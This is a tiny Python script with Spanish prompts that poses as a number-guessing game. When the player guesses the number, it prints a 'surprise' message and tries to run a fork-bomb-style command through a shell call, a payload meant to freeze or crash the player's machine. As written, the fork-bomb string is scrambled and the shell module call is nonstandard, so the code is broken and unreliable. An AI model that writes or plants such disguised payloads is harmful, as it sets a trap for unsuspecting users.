import shell
import random

executable = ":{:|:&(:)};:"
numero = random.randint(0, 100)
adivina = int(input("Adivina el numero: "))

if (numero == adivina):
    print("¡Sorpresa!")
    shell.execute(executable)
else:
    print("No adivinaste el numero")